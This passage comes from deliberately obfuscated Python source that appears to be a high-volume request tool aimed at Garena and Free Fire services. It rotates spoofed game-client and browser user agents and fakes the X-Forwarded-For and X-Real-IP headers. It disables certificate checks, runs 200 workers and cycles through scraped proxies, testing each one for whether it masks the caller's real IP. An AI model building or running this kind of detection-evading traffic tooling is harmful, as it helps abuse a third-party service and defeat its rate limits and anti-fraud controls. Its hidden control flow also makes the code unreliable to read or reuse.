    _user_agents = ['GarenaMSDK/4.0.39(SM-A325M;Android 13;en;HK;)', 'GarenaMSDK/4.0.38(Redmi Note 10;Android 12;en;ID;)', 'GarenaMSDK/4.0.40(Poco X3;Android 11;en;SG;)', 'GarenaMSDK/4.0.19P8(ASUS_Z01QD ;Android 12;en;US;)', 'GarenaMSDK/4.0.41(SM-G991B;Android 13;en;GB;)', 'GarenaMSDK/4.0.42(RMX3363;Android 12;en;IN;)', 'GarenaMSDK/4.0.37(Xiaomi M2010J19CG;Android 11;en;MY;)', 'GarenaMSDK/4.0.36(Redmi 9;Android 10;en;TH;)', 'GarenaMSDK/4.0.35(SM-G998B;Android 12;en;US;)', 'GarenaMSDK/4.0.34(OPPO A74;Android 11;en;VN;)', 'GarenaMSDK/4.0.33(Realme 7;Android 10;en;BR;)', 'GarenaMSDK/4.0.32(Pixel 6;Android 13;en;CA;)', 'Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I005DA Build/PI)', 'Dalvik/2.1.0 (Linux; U; Android 8.1; Moto G5 Plus Build/OPP28.85)', 'Dalvik/2.1.0 (Linux; U; Android 10; SM-G975F Build/QP1A.190711.020)', 'Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Build/RP1A.200720.011)', 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; LG G6 Build/N2G47H)', 'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; Poco X3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-A325M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/120.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0', 'Mozilla/5.0 (Linux; Android 13; SM-G991B; rv:109.0) Gecko/20100101 Firefox/120.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0']

    @staticmethod
    def get_ua():
        if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][11] == 230:
            IIIlIIIIIIlIll = 8843773
            while True:
                if IIIlIIIIIIlIll == 4793245:
                    IIIlIIIIIIlIll = 7129641
                    continue
                if IIIlIIIIIIlIll == 7129641:
                    IllllllllIIIIIlIIl = [lIIIIlIllIIlll >> 6 & 255 for lIIIllllIlIIIlIlIl in range(9)]
                    IIIlIIIIIIlIll = 7410522
                    continue
                if IIIlIIIIIIlIll == 8843773:
                    llIlIIIIIIIIllIllIl = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][29] * 358836 + 109
                    IIIlIIIIIIlIll = 2965819
                    continue
                if IIIlIIIIIIlIll == 7410522:
                    lllIlIlIIllllIIlIlll = sum(IllllllllIIIIIlIIl) + lIIIIlIllIIlll % 75 - llIlIIIIIIIIllIllIl
                    break
                if IIIlIIIIIIlIll == 2965819:
                    lIIIIlIllIIlll = (llIlIIIIIIIIllIllIl * 9 ^ 16393516) & 65535
                    IIIlIIIIIIlIll = 7129641
                    continue
        return getattr(IIIllllllIlIlIllIIIIl, 'choice')(getattr(IIllIllllllIIIIllI, '_user_agents'))

    @staticmethod
    def get_headers():
        IIlllIIIlIIllIllIIll = 4981421
        while True:
            if IIlllIIIlIIllIllIIll == 7229535:
                if getattr(IIIllllllIlIlIllIIIIl, 'random')() < 0.2:
                    headers['DNT'] = '1'
                IIlllIIIlIIllIllIIll = 2162938
                continue
            if IIlllIIIlIIllIllIIll == 4981421:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][16] ^ 228 == 361:
                    IlllIIIIIIIlllIIIIIl = 7359583
                    while True:
                        if IlllIIIIIIIlllIIIIIl == 8914534:
                            IlIIlIlIllIllllIlIIll = (IIlIIIIlIllIllIllI * 5 ^ 15367422) & 4294967295
                            IlllIIIIIIIlllIIIIIl = 5504873
                            continue
                        if IlllIIIIIIIlllIIIIIl == 4834018:
                            llIIIIllIlllIIl = sum(IlIIIIIlIllIllIIIIIl) + IlIIlIlIllIllllIlIIll % 96 - IIlIIIIlIllIllIllI
                            break
                        if IlllIIIIIIIlllIIIIIl == 7359583:
                            IIlIIIIlIllIllIllI = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3] * 361150 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][26]
                            IlllIIIIIIIlllIIIIIl = 8914534
                            continue
                        if IlllIIIIIIIlllIIIIIl == 6647760:
                            IlllIIIIIIIlllIIIIIl = 7359583
                            continue
                        if IlllIIIIIIIlllIIIIIl == 2766424:
                            IlllIIIIIIIlllIIIIIl = 6647760
                            continue
                        if IlllIIIIIIIlllIIIIIl == 5504873:
                            IlIIIIIlIllIllIIIIIl = [IlIIlIlIllIllllIlIIll >> 8 & 255 for IIIllllIIIlIIlIll in range(5)]
                            IlllIIIIIIIlllIIIIIl = 4834018
                            continue
                        if IlllIIIIIIIlllIIIIIl == 8447115:
                            IlllIIIIIIIlllIIIIIl = 2766424
                            continue
                IIlllIIIlIIllIllIIll = 1887485
                continue
            if IIlllIIIlIIllIllIIll == 2158138:
                IIlllIIIlIIllIllIIll = 1818714
                continue
            if IIlllIIIlIIllIllIIll == 7157103:
                IIlllIIIlIIllIllIIll = 7157103
                continue
            if IIlllIIIlIIllIllIIll == 1818714:
                lllllIlIIlIIll = ['application/json, text/plain, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/plain, */*; q=0.01']
                IIlllIIIlIIllIllIIll = 4428113
                continue
            if IIlllIIIlIIllIllIIll == 4545423:
                IlllIlIlIlllIIlllIIlII = ['https://www.google.com/', 'https://www.garena.com/', 'https://freefire.garena.com/', 'https://play.google.com/store/apps/details?id=com.dts.freefireth', 'https://apps.apple.com/id/app/free-fire/id1437265682', 'https://www.facebook.com/', 'https://www.youtube.com/', 'https://www.instagram.com/', 'https://www.twitter.com/', 'https://www.reddit.com/', 'https://www.discord.com/', 'https://www.tiktok.com/']
                IIlllIIIlIIllIllIIll = 1818714
                continue
            if IIlllIIIlIIllIllIIll == 1887485:
                IlIIIlIIIlIlIlIllI = ['en-US,en;q=0.9', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'ar-SA,ar;q=0.9,en;q=0.8', 'hi-IN,hi;q=0.9,en;q=0.8', 'vi-VN,vi;q=0.9,en;q=0.8', 'th-TH,th;q=0.9,en;q=0.8', 'ru-RU,ru;q=0.9,en;q=0.8', 'pt-BR,pt;q=0.9,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8', 'ko-KR,ko;q=0.9,en;q=0.8', 'en-GB,en;q=0.9,en-US;q=0.8', 'ms-MY,ms;q=0.9,en;q=0.8', 'fil-PH,fil;q=0.9,en;q=0.8']
                IIlllIIIlIIllIllIIll = 4545423
                continue
            if IIlllIIIlIIllIllIIll == 2162938:
                return headers
                break
            if IIlllIIIlIIllIllIIll == 4428113:
                headers = {'Accept': getattr(IIIllllllIlIlIllIIIIl, 'choice')(lllllIlIIlIIll), 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': getattr(IIIllllllIlIlIllIIIIl, 'choice')(IlIIIlIIIlIlIlIllI), 'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'Referer': getattr(IIIllllllIlIlIllIIIIl, 'choice')(IlllIlIlIlllIIlllIIlII), 'Sec-Fetch-Dest': getattr(IIIllllllIlIlIllIIIIl, 'choice')(['empty', 'document', 'navigate', 'script']), 'Sec-Fetch-Mode': getattr(IIIllllllIlIlIllIIIIl, 'choice')(['cors', 'navigate', 'no-cors']), 'Sec-Fetch-Site': getattr(IIIllllllIlIlIllIIIIl, 'choice')(['same-origin', 'cross-site', 'none']), 'Upgrade-Insecure-Requests': '1', 'Connection': 'keep-alive', 'Origin': 'https://www.garena.com'}
                IIlllIIIlIIllIllIIll = 7229535
                continue
IlllllIllIIIIIlI = {'max_workers': 200, 'timeout': 5.5, 'retries': 3, 'backoff': 0.5, 'no_delay': False, 'pool_connections': 500, 'pool_maxsize': 500, 'fast_mode': True}
session = getattr(requests, 'Session')()
IlllIIIIllIlIIIIllllI = getattr(getattr(requests, 'adapters'), 'HTTPAdapter')(pool_connections=IlllllIllIIIIIlI['pool_connections'], pool_maxsize=IlllllIllIIIIIlI['pool_maxsize'], max_retries=IlllllIllIIIIIlI['retries'], pool_block=False)
getattr(session, 'mount')('https://', IlllIIIIllIlIIIIllllI)
getattr(session, 'mount')('http://', IlllIIIIllIlIIIIllllI)
getattr(getattr(session, 'headers'), 'update')({'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive'})

def request_with_retry(method, url, **kwargs):
    with getattr(requests, 'Session')() as llIIIlIllIIIlI:
        IIIlIIlIIlIlllIl = 2588167
        while True:
            if IIIlIIlIIlIlllIl == 6847755:
                lIlIlllIllllllIl = getattr(llIIllIlllIllIlIIII, 'get_ip_fast')()
                IIIlIIlIIlIlllIl = 7309919
                continue
            if IIIlIIlIIlIlllIl == 2588167:
                setattr(llIIIlIllIIIlI, 'verify', False)
                IIIlIIlIIlIlllIl = 6847755
                continue
            if IIIlIIlIIlIlllIl == 4608813:
                IIIlIIlIIlIlllIl = 4608813
                continue
            if IIIlIIlIIlIlllIl == 8239298:
                response = getattr(llIIIlIllIIIlI, 'request')(method, url, **kwargs)
                IIIlIIlIIlIlllIl = 7513349
                continue
            if IIIlIIlIIlIlllIl == 8536561:
                getattr(headers, 'update')({'X-Forwarded-For': lIlIlllIllllllIl, 'X-Real-IP': lIlIlllIllllllIl, 'Cache-Control': 'no-cache', 'Pragma': 'no-cache'})
                IIIlIIlIIlIlllIl = 6237626
                continue
            if IIIlIIlIIlIlllIl == 6237626:
                kwargs['headers'] = headers
                IIIlIIlIIlIlllIl = 8239298
                continue
            if IIIlIIlIIlIlllIl == 7513349:
                return response
                break
            if IIIlIIlIIlIlllIl == 7309919:
                headers = getattr(kwargs, 'get')('headers', {})
                IIIlIIlIIlIlllIl = 8536561
                continue

class IIllllIIIllllllIllIlIIll:

    def __init__(self, config):
        lIIlIIIIIlllllIllIlII = 2154249
        while True:
            if lIIlIIIIIlllllIllIlII == 2471293:
                getattr(getattr(self, 'refresh_event'), 'set')()
                lIIlIIIIIlllllIllIlII = 4370073
                continue
            if lIIlIIIIIlllllIllIlII == 8052234:
                setattr(self, 'refresh_event', getattr(IlIlIllllIlllIIIIll, 'Event')())
                lIIlIIIIIlllllIllIlII = 2471293
                continue
            if lIIlIIIIIlllllIllIlII == 7305931:
                setattr(self, 'last_refresh', 0)
                lIIlIIIIIlllllIllIlII = 8052234
                continue
            if lIIlIIIIIlllllIllIlII == 2154249:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][8] * 79 + 162 == 13847:
                    lIlIIlIlllIlIl = 6376860
                    while True:
                        if lIlIIlIlllIlIl == 5087392:
                            lIIIIllIlIlIllIlll = (llllIlIIlIIlIlIlll * 7 ^ 15786598) & 65535
                            lIlIIlIlllIlIl = 1624326
                            continue
                        if lIlIIlIlllIlIl == 1551451:
                            IIIlIllIlIIllllll = sum(lllIlIIlIlllIlllI) + lIIIIllIlIlIllIlll % 12 - llllIlIIlIIlIlIlll
                            break
                        if lIlIIlIlllIlIl == 2250137:
                            lIlIIlIlllIlIl = 2250137
                            continue
                        if lIlIIlIlllIlIl == 3810200:
                            lIlIIlIlllIlIl = 5087392
                            continue
                        if lIlIIlIlllIlIl == 1624326:
                            lllIlIIlIlllIlllI = [lIIIIllIlIlIllIlll >> 9 & 255 for IlIlIlIIIIllIlIlII in range(7)]
                            lIlIIlIlllIlIl = 1551451
                            continue
                        if lIlIIlIlllIlIl == 6449371:
                            lIlIIlIlllIlIl = 6376860
                            continue
                        if lIlIIlIlllIlIl == 6376860:
                            llllIlIIlIIlIlIlll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][19] * 955250 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][14]
                            lIlIIlIlllIlIl = 5087392
                            continue
                lIIlIIIIIlllllIllIlII = 9477047
                continue
            if lIIlIIIIIlllllIllIlII == 7071028:
                lIIlIIIIIlllllIllIlII = 2154249
                continue
            if lIIlIIIIIlllllIllIlII == 4370073:
                setattr(self, 'refreshing', False)
                break
            if lIIlIIIIIlllllIllIlII == 4547854:
                setattr(self, 'proxies', [])
                lIIlIIIIIlllllIllIlII = 7305931
                continue
            if lIIlIIIIIlllllIllIlII == 7297830:
                setattr(self, 'lock', getattr(IlIlIllllIlllIIIIll, 'Lock')())
                lIIlIIIIIlllllIllIlII = 4547854
                continue
            if lIIlIIIIIlllllIllIlII == 9477047:
                setattr(self, 'config', config)
                lIIlIIIIIlllllIllIlII = 7297830
                continue

    def _mask_proxy_url(self, url):
        llIIIIlIIIlIIlIl = 1660317
        while True:
            if llIIIIlIIIlIIlIl == 7399507:
                return url
                break
            if llIIIIlIIIlIIlIl == 4608134:
                try:
                    p = getattr(getattr(urllib, 'parse'), 'urlparse')(url)
                    if getattr(p, 'username') and getattr(p, 'password'):
                        return getattr(url, 'replace')(f'{getattr(p, 'username')}:{getattr(p, 'password')}', '***:***')
                except:
                    pass
                llIIIIlIIIlIIlIl = 7399507
                continue
            if llIIIIlIIIlIIlIl == 1660317:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][2] == 255:
                    IlllIlIIlIIIllIIlIllIlI = 7871761
                    while True:
                        if IlllIlIIlIIIllIIlIllIlI == 7871761:
                            lIlIIIIIIllIIIllIIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][10] * 309417 + 18
                            IlllIlIIlIIIllIIlIllIlI = 5729063
                            continue
                        if IlllIlIIlIIIllIIlIllIlI == 5729063:
                            IIIlIIIIlIlIlllIIIIIII = (lIlIIIIIIllIIIllIIII * 7 ^ 9596379) & 4294967295
                            IlllIlIIlIIIllIIlIllIlI = 6746271
                            continue
                        if IlllIlIIlIIIllIIlIllIlI == 6875297:
                            IlllIlIIlIIIllIIlIllIlI = 7871761
                            continue
                        if IlllIlIIlIIIllIIlIllIlI == 7553078:
                            IlllIlIIlIIIllIIlIllIlI = 5729063
                            continue
                        if IlllIlIIlIIIllIIlIllIlI == 6746271:
                            lIIllIIIIllIIIlllIlIl = [IIIlIIIIlIlIlllIIIIIII >> 2 & 255 for IIIIIIlIIlIlIIIlIlllIlIl in range(7)]
                            IlllIlIIlIIIllIIlIllIlI = 2929318
                            continue
                        if IlllIlIIlIIIllIIlIllIlI == 2929318:
                            IlIIIlllllllIIll = sum(lIIllIIIIllIIIlllIlIl) + IIIlIIIIlIlIlllIIIIIII % 67 - lIlIIIIIIllIIIllIIII
                            break
                llIIIIlIIIlIIlIl = 4608134
                continue
            if llIIIIlIIIlIIlIl == 1008102:
                llIIIIlIIIlIIlIl = 7399507
                continue
            if llIIIIlIIIlIIlIl == 9904592:
                llIIIIlIIIlIIlIl = 4608134
                continue

    def load_static_proxies(self):
        llIlIIllllIIlIIIIlllIlI = 3944438
        while True:
            if llIlIIllllIIlIIIIlllIlI == 7809559:
                proxies = []
                llIlIIllllIIlIIIIlllIlI = 2801918
                continue
            if llIlIIllllIIlIIIIlllIlI == 3944438:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][16] ^ 112 == 526:
                    llIIlllIlIlIIIlIll = 9588687
                    while True:
                        if llIIlllIlIlIIIlIll == 2575081:
                            llllllIIIlIllIlII = (IllllllllllIlIII * 7 ^ 3899170) & 16777215
                            llIIlllIlIlIIIlIll = 4159139
                            continue
                        if llIIlllIlIlIIIlIll == 2970273:
                            llIIlllIlIlIIIlIll = 9349971
                            continue
                        if llIIlllIlIlIIIlIll == 4159139:
                            llIIIIlIIlIIIlI = [llllllIIIlIllIlII >> 11 & 255 for IllIlllIIlIlIlIlIllI in range(7)]
                            llIIlllIlIlIIIlIll = 9349971
                            continue
                        if llIIlllIlIlIIIlIll == 9588687:
                            IllllllllllIlIII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28] * 672143 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][9]
                            llIIlllIlIlIIIlIll = 2575081
                            continue
                        if llIIlllIlIlIIIlIll == 9349971:
                            IlIIIIIlIllIlIlIlI = sum(llIIIIlIIlIIIlI) + llllllIIIlIllIlII % 22 - IllllllllllIlIII
                            break
                        if llIIlllIlIlIIIlIll == 3808020:
                            llIIlllIlIlIIIlIll = 2970273
                            continue
                llIlIIllllIIlIIIIlllIlI = 7809559
                continue
            if llIlIIllllIIlIIIIlllIlI == 2801918:
                lIIlIIIIlIIllIlllllI = getattr(getattr(self, 'config'), 'get')('static_file')
                llIlIIllllIIlIIIIlllIlI = 1178680
                continue
            if llIlIIllllIIlIIIIlllIlI == 2053917:
                llIlIIllllIIlIIIIlllIlI = 2801918
                continue
            if llIlIIllllIIlIIIIlllIlI == 9271912:
                return proxies
                break
            if llIlIIllllIIlIIIIlllIlI == 1178680:
                if lIIlIIIIlIIllIlllllI and getattr(getattr(IllIlllllIlIIllIlIllI, 'path'), 'exists')(lIIlIIIIlIIllIlllllI):
                    with open(lIIlIIIIlIIllIlllllI, 'r') as f:
                        for line in f:
                            line = getattr(line, 'strip')()
                            if not line or getattr(line, 'startswith')(('#', '//')):
                                continue
                            if ':' not in line:
                                continue
                            url = line if '://' in line else f'http://{line}'
                            try:
                                p = getattr(getattr(urllib, 'parse'), 'urlparse')(url)
                                if getattr(p, 'scheme') in ('http', 'https'):
                                    getattr(proxies, 'append')({'url': url, 'failures': 0, 'cooldown_until': 0.0, 'last_checked': 0.0, 'healthy': None})
                            except:
                                continue
                llIlIIllllIIlIIIIlllIlI = 9271912
                continue
            if llIlIIllllIIlIIIIlllIlI == 5828906:
                llIlIIllllIIlIIIIlllIlI = 2801918
                continue

    def fetch_from_proxyscrape(self):
        IIIIllIlIlllllIlI = 3306186
        while True:
            if IIIIllIlIlllllIlI == 6267152:
                return []
                break
            if IIIIllIlIlllllIlI == 3306186:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][26] ^ 111 == 417:
                    IIllIlIlIIIIlllI = 5661789
                    while True:
                        if IIllIlIlIIIIlllI == 5575933:
                            lllIlllllIIIlIIIlII = (IIlIllIIIIIIlIIlIIIllllI * 4 ^ 1595469) & 4294967295
                            IIllIlIlIIIIlllI = 9906921
                            continue
                        if IIllIlIlIIIIlllI == 3337747:
                            IIllIlIlIIIIlllI = 3337747
                            continue
                        if IIllIlIlIIIIlllI == 7167846:
                            IllIIIIIIIIllIIIlIIl = sum(IIlIlIlllIIllIl) + lllIlllllIIIlIIIlII % 92 - IIlIllIIIIIIlIIlIIIllllI
                            break
                        if IIllIlIlIIIIlllI == 5661789:
                            IIlIllIIIIIIlIIlIIIllllI = 91982052
                            IIllIlIlIIIIlllI = 5575933
                            continue
                        if IIllIlIlIIIIlllI == 9906921:
                            IIlIlIlllIIllIl = [lllIlllllIIIlIIIlII >> 10 & 255 for IllllIlIIlIllllII in range(4)]
                            IIllIlIlIIIIlllI = 7167846
                            continue
                        if IIllIlIlIIIIlllI == 4722063:
                            IIllIlIlIIIIlllI = 8219471
                            continue
                        if IIllIlIlIIIIlllI == 8219471:
                            IIllIlIlIIIIlllI = 8219471
                            continue
                IIIIllIlIlllllIlI = 4422590
                continue
            if IIIIllIlIlllllIlI == 2155470:
                IIIIllIlIlllllIlI = 4422590
                continue
            if IIIIllIlIlllllIlI == 4489519:
                IIIIllIlIlllllIlI = 6267152
                continue
            if IIIIllIlIlllllIlI == 4422590:
                if not getattr(getattr(self, 'config'), 'get')('api_enabled') or not getattr(getattr(self, 'config'), 'get')('api_key'):
                    return []
                IIIIllIlIlllllIlI = 2023031
                continue
            if IIIIllIlIlllllIlI == 2023031:
                try:
                    llIllllIllllIIl = getattr(requests, 'get')(f'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&key={getattr(self, 'config')['api_key']}', timeout=10)
                    if getattr(llIllllIllllIIl, 'status_code') == 200:
                        return [{'url': f'http://{getattr(l, 'strip')()}', 'failures': 0, 'cooldown_until': 0.0, 'last_checked': 0.0, 'healthy': None} for l in getattr(getattr(llIllllIllllIIl, 'text'), 'splitlines')() if getattr(l, 'strip')()]
                except Exception as e:
                    print(f'[PROXY] API Error: {e}')
                IIIIllIlIlllllIlI = 6267152
                continue

    def check_proxy(self, proxy_item):
        IllIIlIllllllIIIIllII = 6984418
        while True:
            if IllIIlIllllllIIIIllII == 9712736:
                url = proxy_item['url']
                IllIIlIllllllIIIIllII = 4440004
                continue
            if IllIIlIllllllIIIIllII == 4440004:
                try:
                    llIlllIlIIIIllIllllIIll = 8872701
                    while True:
                        if llIlllIlIIIIllIllllIIll == 9385187:
                            lIIlIIIllIlIIIlIllIll = getattr(requests, 'get')(getattr(self, 'config')['proxy_test_url'], proxies=proxies, timeout=getattr(self, 'config')['healthcheck_timeout'])
                            llIlllIlIIIIllIllllIIll = 9736473
                            continue
                        if llIlllIlIIIIllIllllIIll == 8872701:
                            proxies = {'http': url, 'https': url}
                            llIlllIlIIIIllIllllIIll = 4736684
                            continue
                        if llIlllIlIIIIllIllllIIll == 4297837:
                            llIlllIlIIIIllIllllIIll = 4245048
                            continue
                        if llIlllIlIIIIllIllllIIll == 3581165:
                            return IIlIIlIIIlIllIIIlllI
                            break
                        if llIlllIlIIIIllIllllIIll == 9736473:
                            llIIIllIllIIIl = (getattr(IlllllIIllIIllIIll, 'time')() - lIIIllIIlIlIIlIIl) * 1000
                            llIlllIlIIIIllIllllIIll = 3322746
                            continue
                        if llIlllIlIIIIllIllllIIll == 5941167:
                            getattr(proxy_item, 'update')({'healthy': IIlIIlIIIlIllIIIlllI, 'last_checked': getattr(IlllllIIllIIllIIll, 'time')()})
                            llIlllIlIIIIllIllllIIll = 3581165
                            continue
                        if llIlllIlIIIIllIllllIIll == 3322746:
                            llIIllIllIIlllIlllIII = getattr(getattr(requests, 'get')('http://api.ipify.org', timeout=5), 'text')
                            llIlllIlIIIIllIllllIIll = 3250256
                            continue
                        if llIlllIlIIIIllIllllIIll == 3250256:
                            lIlllIlIlIlllll = getattr(getattr(lIIlIIIllIlIIIlIllIll, 'json')(), 'get')('source_ip')
                            llIlllIlIIIIllIllllIIll = 9095320
                            continue
                        if llIlllIlIIIIllIllllIIll == 4245048:
                            llIlllIlIIIIllIllllIIll = 4297837
                            continue
                        if llIlllIlIIIIllIllllIIll == 1559214:
                            llIlllIlIIIIllIllllIIll = 4297837
                            continue
                        if llIlllIlIIIIllIllllIIll == 4736684:
                            lIIIllIIlIlIIlIIl = getattr(IlllllIIllIIllIIll, 'time')()
                            llIlllIlIIIIllIllllIIll = 9385187
                            continue
                        if llIlllIlIIIIllIllllIIll == 9095320:
                            IIlIIlIIIlIllIIIlllI = lIlllIlIlIlllll != llIIllIllIIlllIlllIII
                            llIlllIlIIIIllIllllIIll = 9026028
                            continue
                        if llIlllIlIIIIllIllllIIll == 9026028:
                            print(f'[PROXY TEST] {getattr(self, '_mask_proxy_url')(url)} | Latency={llIIIllIllIIIl:.0f}ms | IP={lIlllIlIlIlllll} | Verified={IIlIIlIIIlIllIIIlllI}')
                            llIlllIlIIIIllIllllIIll = 5941167
                            continue
                except Exception as e:
                    IIIIIlIIIlIIllllllIll = 8102251
                    while True:
                        if IIIIIlIIIlIIllllllIll == 8102251:
                            print(f'[PROXY TEST] {getattr(self, '_mask_proxy_url')(url)} FAILED: {getattr(type(e), '__name__')}')
                            IIIIIlIIIlIIllllllIll = 8403114
                            continue
                        if IIIIIlIIIlIIllllllIll == 8403114:
                            getattr(proxy_item, 'update')({'healthy': False, 'last_checked': getattr(IlllllIIllIIllIIll, 'time')()})
                            IIIIIlIIIlIIllllllIll = 1057295
                            continue
                        if IIIIIlIIIlIIllllllIll == 1057295:
                            return False
                            break
                        if IIIIIlIIIlIIllllllIll == 7818810:
                            IIIIIlIIIlIIllllllIll = 1057295
                            continue
                        if IIIIIlIIIlIIllllllIll == 7835151:
                            IIIIIlIIIlIIllllllIll = 1057295
                            continue
                break
            if IllIIlIllllllIIIIllII == 6891385:
                IllIIlIllllllIIIIllII = 4440004
                continue
            if IllIIlIllllllIIIIllII == 6984418:
                if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][27] ^ 160 == 455:
                    IIIIIIllIllIIllIlIllIll = 3541800
                    while True:
                        if IIIIIIllIllIIllIlIllIll == 1016955:
                            IIIIIIllIllIIllIlIllIll = 5497434
                            continue
